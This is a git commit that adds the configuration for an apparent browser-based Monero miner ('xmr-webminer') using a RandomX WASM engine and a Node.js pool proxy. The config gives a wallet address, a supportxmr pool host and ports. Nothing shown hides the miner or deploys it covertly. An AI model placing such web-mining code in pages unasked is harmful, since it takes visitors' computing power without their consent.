b5819adc55de0894865f1dcab2505ecd83dc9a51
Dylan Dequanjae Howard <Dylan.D.M.Howard@proton.me>
2026-08-07 21:09:28 -0700

    feat: rebuild with RandomX WASM engine
    - Replace broken CryptoNight WASM with working RandomX
    - Single-container Node.js proxy
    - Wallet configured + pool set to supportxmr.com

---
+++ config.js
@@ -0,0 +1,8 @@
+module.exports = {
+  WALLET:    '8ApdEka2j6CUaaNKp12H1VBi1bziZB2T9Dhju1fPzgiTC8KBLWEEddVeZnpZjg7Ni4KCENsPLfSDfh2nbMhbFqngM5wKwHE',
+  POOL_HOST: 'pool.supportxmr.com',
+  POOL_PORT: 3333,
+  WORKER_NAME: 'xmr-webminer',
+  WS_PORT: 8080,
+  STRATUM_TCP_PORT: 8081,
+};
